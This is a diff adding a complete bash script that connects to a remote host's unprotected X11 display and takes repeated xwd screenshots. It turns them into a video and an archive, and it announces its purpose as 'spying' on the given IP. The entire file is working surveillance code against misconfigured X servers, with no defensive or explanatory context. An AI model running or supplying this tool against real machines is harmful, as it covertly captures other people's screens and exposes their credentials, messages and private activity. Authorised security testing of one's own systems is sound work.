@@ -1,0 +1,114 @@
+#!/bin/bash
+# Nicolas Biscos - 25 May 2012
+
+function doHelp()
+{
+   echo "Make videos from unprotected X11 listener"
+   echo
+   echo "Usage: $(basename $0) [-h] [-t delay] [-o outname] [-d display] [-c count]"
+   echo "   -h           display this message and exit"
+   echo "   -t <delay>   delay between capture"
+   echo "   -o <outname> output file name"
+   echo "   -d <display> display number to connect to"
+   echo "   -c <count>   capture count to perfom"
+   echo
+   exit 0
+}
+
+function doCheck()
+{
+   local notfound=0
+
+   for app in $xwd $convert $ffmpeg;
+   do
+      if [ ! -x $app ];
+      then
+         echo "Please install $app first..."
+         notfound=$(($notfound+1))
+      fi
+   done
+   if [ 0 -ne $notfound ];
+   then
+      exit -1
+   fi
+}
+
+# DO NOT CHANGE MAX as the file format relies on it !!!
+MAX=999
+
+base=video
+delay=1
+ip=127.0.0.1
+display=0
+count=$MAX
+
+TEMP=`getopt -o t:o:d:c:h -n 'capture_video' -- "$@"`
+
+if [ $? != 0 ] ;
+then
+   echo "Terminating..." >&2
+   exit 1
+fi
+
+# Note the quotes around `$TEMP': they are essential!
+eval set -- "$TEMP"
+
+while true ; do
+	case "$1" in
+      -o) base=$2 ; shift 2 ;;
+      -t) delay=$2 ; shift 2 ;;
+      -d) display=$2 ; shift 2 ;;
+      -c) count=$2 ; shift 2 ;;
+      -h) doHelp ;;
+		--) shift ; break ;;
+		*) echo "Internal error!" ; exit 1 ;;
+	esac
+done
+
+ip=$1
+
+xwd=/usr/bin/xwd
+convert=/usr/bin/convert
+ffmpeg=/usr/bin/ffmpeg
+doCheck
+
+if [ -f $base.mpg ];
+then
+   echo "File $base.mpg already exists - aborting"
+   exit -1
+fi
+
+if [ "_" != "${ip}_" ];
+then
+   echo "spying ${ip}"
+else
+   echo "spying localhost"
+fi
+
+x=1
+while [ $x -le $MAX -a $x -le $count ];
+do
+   file=${base}_$(printf %03d $x)
+   if [ "_" != "${ip}_" ];
+   then
+      target="-display ${ip}:${display}.0"
+   fi
+   $xwd -root $target -out $file
+   if [ 0 -ne $? ];
+   then
+      echo "Host does not answer - aborting"
+      break;
+   fi
+   $convert $file ${file}.jpg && rm $file
+   x=$(($x+1))
+   sleep $delay
+done
+
+if [ -f ${base}_001.jpg ];
+then
+   $ffmpeg -f image2 -i ${base}_%03d.jpg -vcodec mpeg2video $base.mpg >& /dev/null
+   /bin/tar zcf ${base}.tgz ${base}*.jpg
+   /bin/rm ${base}*.jpg
+fi
+
+
